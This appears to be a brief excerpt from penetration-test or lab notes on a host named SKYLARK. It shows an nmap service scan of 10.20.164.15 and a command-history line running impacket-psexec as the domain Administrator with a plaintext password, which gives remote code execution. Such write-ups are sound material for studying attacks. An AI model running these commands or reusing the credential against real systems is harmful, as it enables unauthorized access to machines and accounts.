...
- C:\inetpub\wwwroot\SkylarkPartnerPortal\.git\local.txt
...
# Enumeration
## NMAP
`sudo nmap -sV 10.20.164.15 --top-ports 1000`
```
...
# Command History
```c
impacket-psexec SKYLARK/Administrator:E2koUInnHx5_nrAjBouE@10.20.164.15
